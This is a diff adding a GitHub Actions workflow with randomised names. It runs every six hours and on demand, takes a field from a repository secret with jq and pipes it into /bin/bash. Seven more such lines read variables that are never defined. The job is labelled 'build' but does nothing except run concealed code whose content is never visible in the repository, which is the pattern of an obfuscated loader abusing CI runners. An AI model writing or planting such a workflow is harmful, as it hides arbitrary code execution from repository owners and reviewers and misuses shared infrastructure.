@@ -1,0 +1,24 @@
+name: yinkaldk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinkaldk
+        env:
+          zbgo4524: ${{ secrets.zbgo4524 }}
+        run: |
+          echo $zbgo4524 | jq -r .tlngu172 | /bin/bash
+          echo $yy55027 | jq -r .lpdcg956 | /bin/bash
+          echo $roda517 | jq -r .omcb2 | /bin/bash
+          echo $fw125 | jq -r .htsi25 | /bin/bash
+          echo $hkgn08604 | jq -r .kuo278 | /bin/bash
+          echo $zy735 | jq -r .edw8 | /bin/bash
+          echo $r443 | jq -r .hz8 | /bin/bash
+          echo $z27 | jq -r .z47043 | /bin/bash
+
